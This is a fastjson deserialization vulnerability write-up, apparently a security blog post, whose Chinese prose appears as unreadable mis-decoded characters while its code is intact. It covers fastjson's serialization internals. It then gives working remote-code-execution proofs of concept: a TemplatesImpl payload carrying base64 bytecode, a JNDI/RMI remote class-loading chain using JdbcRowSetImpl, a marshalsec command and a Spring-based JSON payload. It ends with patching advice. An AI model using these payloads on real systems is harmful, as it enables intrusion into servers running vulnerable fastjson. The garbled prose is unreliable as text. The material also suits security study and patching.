<center><font size=6>fastjson�����л�©������</font></center>
<h1>1.fastjson���</h1>
<p>fastjson�ǰ���Ŀ�Դ����ʵ��java�����json���ݸ�ʽ���໥ת������ų����ܺܺã��ڹ��ڱ��㷺Ӧ�á�</p>
<h2>1.1 ©��Ӱ�����</h2>
<p>fastjson�汾����1.2.24ʱ�����γ�RCE��</p>
<h2>1.2 fastjsonʹ��</h2>
<h3>1.2.1 ���л�</h3>
<p><font color=red>���л����̲���Ӱ�����Ƿ���fastjson©��������ֻ���򵥽��ܡ�</font></p>

```java
public class Person {
    public String name;
    private int age;
    private School school;
    public Person(){
        System.out.println("in no param constructor");
    }
    public Person(String str, int n,School school){
        System.out.println("Inside Person's Constructor");
        name = str;
        age = n;
        this.school =school;
    }
}

```
<p>��Person�������л������ֽ�name���Իᱻ���л���</p>
<img src=11.png></img>

<p>�޸�Person�࣬δage��Ա���public��Getter��</p>
```java
public class Person {
    public String name;
    private int age;
    private School school;
    public Person(){
        System.out.println("in no param constructor");
    }
    public Person(String str, int n,School school){
        System.out.println("Inside Person's Constructor");
        name = str;
        age = n;
        this.school =school;
    }

    public int getAge(){
        System.out.println("in getAge");
        return age;
    }
```
<p>ӵ��public��Getter��name����Ҳ�����л���</p>
<img src=12.png></img>
<p>ͬ����School��Ա��public����ӵ��public Getterʱ����������л���School����ĳ�Ա���л����̺ʹ�һ�¡�</p>
<p><b>���ۣ�</b></p>
<ul>
<li>�Ӷ���Ƕȣ����л�������һ�ֶ�������</li>
<li>����public���Եĳ�Ա�����л�ʱ��ֱ�ӷ��ʣ������ܹ���������л���</li>
<li>���ڷ�public���Եĳ�Ա�������public��getXyz()������������getXyz()����������л���</li>
<li>���ڷ�public���Գ�Ա������public��getter���򲻻�������л���</li>
</ul>
<p><b>���Ͻ��۳���ʵ���⣬Ҳ���������ݣ�fastjson��������л����಻��һ��package��Ҫ��������л�������ӵ�ж�Ӧ�ĳ�Ա�ķ���Ȩ�ޣ����ҽ�������Ϊpublic���������public��getter����ʱ��fastjson ���ܶ�ȡ�˳�Ա���ԡ�</b></p>

<h3>1.2.2 �����л�</h3>
<p>�������л�������Ȼ�����Ƿ���fastjson©��û��Ӱ�죬��<b>��ⷴ���л������е�һЩϸ�ڸ��˾��ö����fastjson�����л�RCE���б�Ҫ��</b></p>
<p><b>(1) ��ͨ��ķ����л�</b></p>
```java

public class Person {
    private String name;
    public int age;

    public Person(){
        System.out.println("in no param constructor");
    }
    public Person(String str, int n){
        System.out.println("Inside Person's Constructor");
        name = str;
        age = n;
    }
   public String getName(){
        System.out.println("in getName");
        return name;
    }

    public int getAge(){
        System.out.println("in getAge");
        return age;
    }
 }
```
```java
    public static void main(String[] args){
        Person p = new Person("venscor",25);
        String s = JSON.toJSONString(p);
        System.out.println(s);
        System.out.println("******test fastjson str 2 obj******");
        Person pp = (Person)JSON.parseObject(s,Person.class);
        System.out.println(JSON.toJSONString(pp));
    }
```

<p>���в��Դ��룬���ַ����л���ͨ�����ö�����޲ι�������ɵģ��ҽ�age��Ա�������л���</p>
<img src=13.png></img>

<p>�����޸�Person�࣬Ϊname��Ա���public��Setter������</p>
```java

public class Person {

    private String name;
    public int age;

    public Person(){
        System.out.println("in no param constructor");
    }
    public Person(String str, int n){
        System.out.println("Inside Person's Constructor");
        name = str;
        age = n;
    }
   public String getName(){
        System.out.println("in getName");
        return name;
    }

    public int getAge(){
        System.out.println("in getAge");
        return age;
    }


    public  void setName(String str){
        System.out.println("in setname");
        this.name = str;
    }

}


```
<p>�������в��Է�������������public Setter��name��ԱҲ�������л���</p>
<img src=14.png></img>
<p>ͨ������ʵ�飬���Ƿ��֣�</p>
<p><b>a. fastjson�����л���ͨ�����ö�����޲ι�������ɵģ�</b></p>
<p><b>b. �����л��ǴӶ���Ƕ�����"д����"��������ĳ�ԱΪpublic����ӵ��public Setterʱ���Żᱻ�����л�������Ҫô�ó�ԱΪ0(������������)��ҪôΪnull(����������)��</b></p>

<p><b>(2) �Ը�����ķ�����</b></p>
```java
public class PersonParent {
    private String family;

    public PersonParent(String family) {
        System.out.println("in PersonParent with param constructor");
        this.family = family;
    }

    public PersonParent() {
        System.out.println("in PersonParent no param constructor");
    }

    public String getFamily() {
        return family;
    }

    public void setFamily(String family) {
        this.family = family;
    }
}


```


```java
public class Person extends PersonParent implements ParentInterface{
    private String name;
    public int age;
    private School school;
    public Person(){
        System.out.println("in no param constructor");
    }
    public Person(String str, int n,School school){
        System.out.println("Inside Person's Constructor");
        name = str;
        age = n;
        this.school = school;
    }
   public String getName(){
        return name;
    }

    public int getAge(){
        return age;
    }

    public School getSchool() {

        return school;
    }

    public  void setSchool(School school) {
        System.out.println("in setSchool");
        this.school = school;
    }

    public  void setName(String str){
        System.out.println("in setname");
        this.name = str;
    }


    public String test() {
        return null;
    }

}

```
<p>�������Գ���</p>
<img src=15.png></img>
<p>���淴���л��Ķ������Ա���������������Ա�����һ��и���ͽӿڣ������н�����¿��Կ�����<b>�������л�ʱ���ȵ��ø����޲ι��������ɸ������Ȼ����ö����Ա���޲ι��������ɶ����Ա��֮�����Setter�����õ������ĳ�Ա��</b></p>
<p><b>(3) ��public���Գ�Ա���л�</b> </p>

<p>��������ķ�����Ĭ������£����ڶ�package���ⲻ��д�ĳ�Ա��fastjsonĬ���ǲ�����䷴���л��ġ��׿�fastjson��ô���Ĳ��ԣ�����˼��һ�����⣬���������Լ�ʵ��������ܣ�֧�ֶ�private���Եĳ�Ա���л�/�����л�������Ӧ����ô����</p>

<p>��java��Ϥ��ͬѧ�϶����뵽��java��������ܹ�ʵ�ֶ�˽�г�Ա�Ķ�д����Ȼ���Ƕ����뵽��fastjsonû�����ɲ�֧����һ���ܡ�</p>

<p>fastjson�����л�˽�г�Աʱ����Ҫ����Feature.SupportNonPublicField���������Ǿ����о���fastjson���˽�г�Ա�ķ����л����̡�</p>
```java
public class Student {
    private String name;
    private int grade;
    private int num;
    private School _school;

    public String getName() {
        System.out.println("in getName");
        return name;
    }

    public School get_school() {
        System.out.println("in get_school");
        return _school;
    }



    public synchronized int getNum() {
        System.out.println("getNum");
        return num;
    }

    public synchronized void setNum(int num) {
        System.out.println("setNum");
        this.num = num;
    }

    public Student() {
        System.out.println("Student no param constructor");
    }

    public Student(String name, int grade,int num,School school) {
        System.out.println("Student 3 param constructor");
        this.name = name;
        this.grade = grade;
        this.num = num;
        this._school = school;
    }

    void print(){
        System.out.println("name:"+name+"\ngrade:"+grade+"\nnum:"+num+"\nSchool:"+_school.getName());
    }
}

```
<p>���Դ��룺</p>

```java
    public  static void main(String[]args){
        ParserConfig config = new ParserConfig();
        String s = "{\"name\":\"venscor\",\"grade\":3,\"num\":100,\"_school\":{\"name\":\"xidian\"}}";
        System.out.println(s);
        System.out.println("**********************");
        Student obj = (Student)JSON.parseObject(s, Student.class, config, Feature.SupportNonPublicField);

        System.out.println("-----------------------------");
        obj.print();
    }
```
<p>���н����</p>
<img src=16.png></img>
<p>�����н�����Կ��������˶�private��Ա�����˷����л���������û��ʲô���</p>

<p><b>(4) �����л�Դ�����</b></p>
<p>�Գ���java��ķ����л���������ջ�������£�</p>
<img src=17.png></img>
<p>�Զ����Ա�Ĵ�����Ҫ��FieldDeserializer���setValue()���������Ǽ�Ҫ���������������Դ�룺</p>
```java
public void setValue(Object object, Object value) {
        if (value != null || !this.fieldInfo.fieldClass.isPrimitive()) {
            try {
                Method method = this.fieldInfo.method;
                if (method != null) {
                    if (this.fieldInfo.getOnly) {
                        if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                            AtomicInteger atomic = (AtomicInteger)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicInteger)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                            AtomicLong atomic = (AtomicLong)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicLong)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                            AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);
                            if (atomic != null) {
                                atomic.set(((AtomicBoolean)value).get());
                            }
                        } else if (Map.class.isAssignableFrom(method.getReturnType())) {
                            Map map = (Map)method.invoke(object);
                            if (map != null) {
                                map.putAll((Map)value);
                            }
                        } else {
                            Collection collection = (Collection)method.invoke(object);
                            if (collection != null) {
                                collection.addAll((Collection)value);
                            }
                        }
                    } else {
                        method.invoke(object, value);
                    }

                } else {
                    Field field = this.fieldInfo.field;
                    if (this.fieldInfo.getOnly) {
                        if (this.fieldInfo.fieldClass == AtomicInteger.class) {
                            AtomicInteger atomic = (AtomicInteger)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicInteger)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicLong.class) {
                            AtomicLong atomic = (AtomicLong)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicLong)value).get());
                            }
                        } else if (this.fieldInfo.fieldClass == AtomicBoolean.class) {
                            AtomicBoolean atomic = (AtomicBoolean)field.get(object);
                            if (atomic != null) {
                                atomic.set(((AtomicBoolean)value).get());
                            }
                        } else if (Map.class.isAssignableFrom(this.fieldInfo.fieldClass)) {
                            Map map = (Map)field.get(object);
                            if (map != null) {
                                map.putAll((Map)value);
                            }
                        } else {
                            Collection collection = (Collection)field.get(object);
                            if (collection != null) {
                                collection.addAll((Collection)value);
                            }
                        }
                    } else if (field != null) {
                        field.set(object, value);
                    }

                }
            } catch (Exception var6) {
                throw new JSONException("set property error, " + this.fieldInfo.name, var6);
            }
        }
   }
```
<p>��������������̱Ƚϼ򵥣����ȣ���鿴ԭJson������ĳ�Ա�Ƿ���ڶ�Ӧ��Setter����Getter�������Ӧ�ĳ�Ա����ֻ���ģ���ͨ���������setter������ĳЩ��Ա���������ͣ��������Getter������������Getter����ֵ��Map���͡����ڳ�Աû�ж�Ӧ��Getter��Setter�ģ������Ա��public�ģ���ֱ������java����������ֵ�������Ա��ֻ���ģ���ô���ݳ�Ա���͵��ö�Ӧ�ķ��������á�(���Ƿ�֧��Feature.SupportNonPublicField�ڴ˺���֮ǰ��)</p>

<h3><b>1.2.4 ����</b></h3>
<ul>
    <li>fastjson�����л�����һ�֡�д�������������������ͨ��ֱ�ӵ����޲ι�������ɵģ�</li>
    <li>Ĭ������£�fastjson�������л�public ��Ա������public Setter�ĳ�Ա��</li>
    <li>�����и��࣬�������ԱҲ�Ƕ���ʱ������Ҳ�ᱻ�����л��������л�˳�����ǲ����ġ�</li>
    <li>java�������л�ʱ������public��SetterֻҪjson���ж�Ӧ��field����setter�ͻᱻ���ã����������Ӧ��field�Ƿ���ʵ���ڡ����磬Person�и�public setName(),����û��name��Ա��ֻҪ�������л���json����name��String����setName�ͻᱻ���á�</li>
</ul>
<h1>2. ����©����Demo</h1>
<p>©������ԭ��ʮ�ּ򵥣�������fastjson��parse()�����������л�ʱ��������ɶ����ԭʼ���ݿ��Ա������߿��ƣ��ڴ��뻷���´��ڿ����õ�gadgetʱ�������RCE©����</p>
```java
    public static void main(String[] args){        
        String strUnderControl = "";
        JSON.parse(strUnderControl);
    }
```
<h1>3. PoC</h1>
<p>���˵�һ�ڵķ������ٷ���poc�ͼ��ˣ����鿴��PoCǰ��������һ�ڡ�</p>
<h2>3.1 �������˵͹�fastjson RCE������PoC</h2>
<p>�����������fastjson��PoC���ǻ���TemplatesImpl�ģ�PoC���¡�</p>
```java
public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}

```
```java

public class Poc {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\person\\Test.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"]," +
                "'_name':'a.b'," +
                "'_tfactory':{ }," +
                "\"_outputProperties\":{ }}\n";
        System.out.println(text1);
        //String personStr = "{'name':"+text1+",'age':19}";
        //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);
        Object obj = JSON.parseObject(text1, Object.class,config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());

    }

    public static void main(String args[]){

        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
<p>���ǿ���TemplatesImpl�ࣺ</p>
```java

public final class TemplatesImpl implements Templates, Serializable {
    static final long serialVersionUID = 673094361519270707L;
    private static String ABSTRACT_TRANSLET = "org.apache.xalan.xsltc.runtime.AbstractTranslet";
    private String _name = null;
    private byte[][] _bytecodes = (byte[][])null;
    private Class[] _class = null;
    private int _transletIndex = -1;
    private Hashtable _auxClasses = null;
    private Properties _outputProperties;
    private int _indentNumber;
    private transient URIResolver _uriResolver = null;
    private transient ThreadLocal _sdom = new ThreadLocal();
    private transient TransformerFactoryImpl _tfactory = null;

    protected TemplatesImpl(byte[][] bytecodes, String transletName, Properties outputProperties, int indentNumber, TransformerFactoryImpl tfactory) {
        this._bytecodes = bytecodes;
        this._name = transletName;
        this._outputProperties = outputProperties;
        this._indentNumber = indentNumber;
        this._tfactory = tfactory;
    }

    protected TemplatesImpl(Class[] transletClasses, String transletName, Properties outputProperties, int indentNumber, TransformerFactoryImpl tfactory) {
        this._class = transletClasses;
        this._name = transletName;
        this._transletIndex = 0;
        this._outputProperties = outputProperties;
        this._indentNumber = indentNumber;
        this._tfactory = tfactory;
    }
    
    public TemplatesImpl() {
    }
    ....
    
    public synchronized Properties getOutputProperties() {
        try {
            return this.newTransformer().getOutputProperties();
        } catch (TransformerConfigurationException var2) {
            return null;
        }
    }
    ������
    
}
```

<p>���poc������_outputPropertiesӵ��Getter������Getter�е㲻���ϱ�׼��ʽ������fastjson�������ܸ㶨������Propertiesʵ����Map������getOutputProperties()�ᱻ���á�</p>
<img src=18.png></img>

<img src=19.png></img>
<p>�����鿴newTransformer()������</p>

<img src=20.png></img>

<img src=21.png></img>

<img src=22.png></img>

<p>���һ����PoC�������̾������ˣ�(�˴���ͼһ��)</p>
<img src=23.png></img>

<p>��������PoC�õ���_name,_bytecodes��private��Ա��������Ҫ��parseObject()ʱ����Feature.SupportNonPublicField����������ã�����_name��Ϊnull�������º����NullPointerException�����У��ܶ�����Ϊfastjson RCE��Ҫ����д������ģʽ�Ĵ���Ż����©�����Ӷ��͹������©����<b>(���潲��������poc����û������)</b></p>

```java

    public static void main(String args[]){
        try {
              Object obj = JSON.parseObject(text1, Object.class,config,Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        } 
    }

```
<h2>3.2 ����JNDI��PoC</h2>
<p>��֮ǰ�����java�����л�©��(ԭ��ƪ)��ʱ�������򵥽�����һ������Spring�����©����PoC����Ҫ������һЩ�е���֮������lookup()�����Ĳ����ɿأ��Ӷ�����RCE�����λ���JDNI��PoC�ʹ���΢�е����ƣ����ն��ع鵽lookup()�������Ա������߿��ơ�</p>
<h3>3.2.1 JNDI���</h3>
<p>JNDIΪ����Զ��java�����ṩ�˿��ܣ����嶨�����ﲻ�������ͣ�������Google�������16���BlackHat�ϵ�ͼһ�ţ���˵��JNDI�ļܹ���</p>
<img src=24.png></img>
<p>��ײ���Ǿ���ʵ�ֻ��ƣ�����RMI��LDAP�ȡ����¶�RMIʹ�����򵥽��ܣ�����ɲο�http://damies.iteye.com/blog/51778��ͨ����ʹ�üܹ��������£�</p>
<img src=25.png></img>
<p>�Ӵ���Ƕ����²��ԣ�������Զ�̻����µ���,������������web���ʵ�Ŀ¼�£��ҽ�Exploit.class������tomcat�ĸ�Ŀ¼��,�ҵ�http�˿���8888��</p>
```java
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("calc");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}

```
<p>Ȼ����RMI����ʹ�ö˿�1099��</p>
```java
public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Exploit",
                "Exploit","http://127.0.0.1:8888/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);

    }
    public static void main(String[] args) throws RemoteException,NamingException,AlreadyBoundException{
        start();
    }
}

```
<p>��󣬴ӿͻ�������RMI��Ȼ�����Զ�̼���Exploit�����ˡ�</p>
```java
    public static void testRmi() throws NamingException {
        String url = "rmi://127.0.0.1:1099";
        Hashtable env = new Hashtable();
        env.put(Context.PROVIDER_URL, url);
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        Context context = new InitialContext(env);
//        Object object = context.lookup("Exploit");//ok
        Object object1 = context.lookup("rmi://127.0.0.1/Exploit");
        System.out.println("Object:" + object1);
    }
    public static void main(String[] argv) throws NamingException {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        testRmi();

    }
```
<p>���в��Դ��룬Exploit�๹����ִ�У���������������</p>

<h3>3.2.2 PoC</h3>
<p>PoC����JdbcRowSetImpl����JDK 6u132, 7u122, or 8u113���ϱ��޲������ǿ���JdbcRowSetImpl�ࣺ</p>
```java
public class JdbcRowSetImpl extends BaseRowSet implements JdbcRowSet, Joinable {
    private Connection conn;
    private PreparedStatement ps;
    private ResultSet rs;
    private RowSetMetaDataImpl rowsMD;
    private ResultSetMetaData resMD;
    private Vector<Integer> iMatchColumns;
    private Vector<String> strMatchColumns;
    protected transient JdbcRowSetResourceBundle resBundle;
    static final long serialVersionUID = -3591946023893483003L;
    ������
```
<p>����fastjson�����л����ƣ����ȷ����л�BaseRowSet���࣬��������setDataSourceName()��public Setter��</p>
```java
    public void setDataSourceName(String name) throws SQLException {

        if (name == null) {
            dataSource = null;
        } else if (name.equals("")) {
           throw new SQLException("DataSource name cannot be empty string");
        } else {
           dataSource = name;
        }

        URL = null;
    }
```
<p>Ȼ�����л�JdbcRowSetImpl�࣬�����и�setAutoCommit()��public Setter��</p>
```java
    public void setAutoCommit(boolean var1) throws SQLException {
        if (this.conn != null) {
            this.conn.setAutoCommit(var1);
        } else {
            this.conn = this.connect();
            this.conn.setAutoCommit(var1);
        }

    }
```
<p>�������л�ʱ��json�������������dataSourceName��autoCommit�ֶΣ�������Setter�ᱻ���á�</p>
<p>���Ǽ�������connect()������</p>
```java
  private Connection connect() throws SQLException {
        if (this.conn != null) {
            return this.conn;
        } else if (this.getDataSourceName() != null) {
            try {
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
                return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
            } catch (NamingException var3) {
                throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
            }
        } else {
            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
        }
    }
```
<p>���Կ�����lookup()�Ĳ�����������dataSourceName�����Է����л����ݡ���������~~~poc���£�</p>
```java

public class JdbcRowSetImplPoc {
    public static void main(String[] argv){
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

        testJdbcRowSetImpl();
    }
    public static void testJdbcRowSetImpl(){           
       String payload = "{\"@type\"\"com.sun.rowset.JdbcRowSetImpl\"\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        JSON.parse(payload);
    }

}

```

<p>�ع���������������</p>
parseObject()/parse()---->setValue()----->setDataSourceName---->setAutoCommit()---->connect()----->lookup()��

<h2>3.3 ����PoC</h2>
<p>PoC�������ƺ�Jacksonʮ�����ƣ����ô��е�malshalsec����jackson��poc����΢�ĸľ�������fastjson������һһ�����ˡ��������SpringPropertyPathFactory��</p>
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson SpringPropertyPathFactory "rmi://localhost:1099/Exploit"
```
```json
[
	"org.springframework.beans.factory.config.PropertyPathFactoryBean",
	{
		"targetBeanName":"rmi://localhost:1099/Exploit",
		"propertyPath":"foo",
		"beanFactory":
		[
			"org.springframework.jndi.support.SimpleJndiBeanFactory",
			{
				"shareableResources":["rmi://localhost:1099/Exploit"]
			}
			
		]
	}
	
]
```
<p>����fastjson���л���ʽ��΢�޸�</p>
```json
{
	"@type":"org.springframework.beans.factory.config.PropertyPathFactoryBean",
	
	"targetBeanName":"rmi://localhost:1099/Exploit",
	"propertyPath":"foo",
	"beanFactory":
	{
		"@type":"org.springframework.jndi.support.SimpleJndiBeanFactory",
		"shareableResources":["rmi://localhost:1099/Exploit"]		
	}
}
```


<p>�ܶ෴���л��������ڶ���Setter,Getter,hashCode(),equals(),toString()��</p>



<p></p>
<p></p>

<h1>4. ����</h1>
<p>�ο��ٷ���ȫ���棺https://github.com/alibaba/fastjson/wiki/security_update_20170315</p>
<p>(1) ����fastjson��1.2.25�����ϣ�������˺������ࣻ</p>
<p>(2) ��Ҫ�ּ�����autotype�������л������ࡣ</p>
